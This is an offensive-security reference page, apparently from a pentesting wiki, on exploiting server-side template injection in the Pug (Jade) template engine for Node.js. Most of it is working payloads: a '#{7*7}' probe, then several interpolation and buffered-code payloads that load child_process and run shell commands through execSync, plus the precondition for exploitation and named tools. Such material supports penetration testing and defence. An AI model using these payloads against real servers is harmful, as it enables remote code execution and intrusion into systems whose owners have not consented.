---
title: "Pug server-side template injection"
description: "Exploiting Pug (Jade) SSTI in Node.js: confirming with #{7*7}, and running inline JavaScript through interpolation and buffered code to require('child_process')."
keywords:
  - Pug SSTI
  - Jade template injection
  - buffered code
  - require child_process
  - global process
---

# Pug

Pug (formerly Jade) compiles templates into JavaScript functions, and several of its constructs accept inline JavaScript expressions, so an injection into template source is close to direct code execution. Confirm with `#{7*7}` rendering `49`.

Interpolation evaluates any JavaScript expression, so a one-liner loads `child_process` and runs a command:

```pug
#{global.process.mainModule.require('child_process').execSync('id')}
```

`global.process.mainModule.require` reaches the real `require` from inside the template scope, avoiding reliance on a local `require` binding. Pug's buffered code (`=`) and unbuffered code (`-`) lines run statements directly, giving a cleaner multi-line form:

```pug
- var x = global.process.mainModule.require('child_process')
= x.execSync('whoami').toString()
```

When input is injected mid-attribute or mid-line rather than as a full template, break into an expression context first. A common pattern escapes an interpolation and appends the payload:

```pug
= 7*7
#{function(){localLoad=global.process.mainModule.constructor._load; return localLoad('child_process').execSync('id').toString()}()}
```

The precondition is the same as other Node engines: the untrusted value must reach `pug.compile`/`pug.render` as template source (or be concatenated into it), not merely passed as a locals value, which is treated as data. Confirm with `#{7*7}`; once arithmetic evaluates, the `global.process.mainModule.require('child_process')` payload is immediate RCE because Pug applies no sandbox to inline JavaScript.

## Tools

- tplmap, SSTImap

## References

- Pug documentation: interpolation, buffered and unbuffered code
- PortSwigger Web Security Academy: Server-side template injection
